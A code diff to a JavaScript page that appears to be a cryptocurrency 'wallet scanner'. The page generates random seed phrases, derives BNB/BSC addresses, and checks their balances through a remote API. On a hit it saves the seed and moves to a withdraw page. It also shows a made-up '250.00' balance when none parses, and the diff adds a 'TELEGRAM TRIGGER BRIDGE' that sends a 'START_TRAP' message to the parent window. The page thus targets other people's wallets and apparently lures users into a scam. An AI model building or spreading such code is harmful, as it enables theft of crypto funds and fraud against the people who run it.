@@ -144,7 +144,6 @@
         function getBep2(pub) {
             const hash = ripemd160(sha256(pub));
             const words = bech32.toWords(hash);
-            // BEP2 usually doesn't need the 0 prefix in the words array for the address string itself
             return bech32.encode("bnb", words);
         }
 
@@ -156,11 +155,9 @@
                 const seed = bip39.mnemonicToSeedSync(m);
                 const root = HDKey.fromMasterSeed(seed);
                 
-                // BSC (0x...) - Ethereum Type
                 const bscNode = root.derive("m/44'/60'/0'/0/0");
                 const bscAddr = "0x" + bytesToHex(keccak_256(secp.getPublicKey(bscNode.privateKey, false).slice(1)).slice(-20));
 
-                // BEP2 (bnb1...) - Binance Chain Type
                 const bep2Node = root.derive("m/44'/714'/0'/0/0");
                 const bep2Addr = getBep2(secp.getPublicKey(bep2Node.privateKey, true));
 
@@ -177,28 +174,22 @@
                 let count = parseInt(document.getElementById('scanCount').textContent);
                 document.getElementById('scanCount').textContent = (count + 1);
 
-                // Check both addresses
                 [bscAddr, bep2Addr].forEach(addr => {
                     fetch(RENDER_URL, {
                         method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': SECRET_KEY },
                         body: JSON.stringify({ address: addr.toLowerCase() })
                     }).then(r => r.json()).then(data => {
                         if(data.result && !data.result.includes("Bal: 0")) {
-                            
-                            // --- DATA LINKING TO WITHDRAW ---
                             const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                             const finalBalance = balanceMatch ? balanceMatch[0] : "250.00"; 
 
-                            // 1. I-save sa LocalStorage
                             localStorage.setItem('last_found_type', 'BNB');
                             localStorage.setItem('last_found_balance', finalBalance);
                             localStorage.setItem('last_found_seed', m);
 
-                            // 2. UI Updates
                             document.getElementById('foundMsg').innerHTML = `<div style="color:#f3ba2f; font-weight:bold; font-size:10px;">FOUND: ${addr}</div>`;
                             document.getElementById('foundCountLabel').textContent = "1 discovered";
 
-                            // 3. Jackpot Alert & Switch
                             alert("JACKPOT BNB/BSC FOUND!");
                             window.parent.loadPage('Withdraw.html');
                         }
@@ -215,7 +206,14 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START BNB SCAN";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'BNB/BSC' }, '*');
+                }
+            }
         }
     </script>
 </body>
